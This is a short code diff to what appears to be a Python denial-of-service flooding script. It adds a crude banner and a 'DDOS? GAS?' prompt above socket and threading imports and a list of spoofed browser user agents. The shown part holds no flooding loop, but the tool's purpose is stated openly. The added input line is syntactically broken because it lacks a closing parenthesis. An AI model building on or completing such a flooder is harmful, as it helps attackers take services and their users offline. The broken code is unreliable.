@@ -1,6 +1,9 @@
 
-
+import os
 import random, socket, threading
+os.system("clear")
+print("TOOLS INI BAU PELER")
+name = str(input("DDOS? GAS?")
 
 useragents = [
      'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
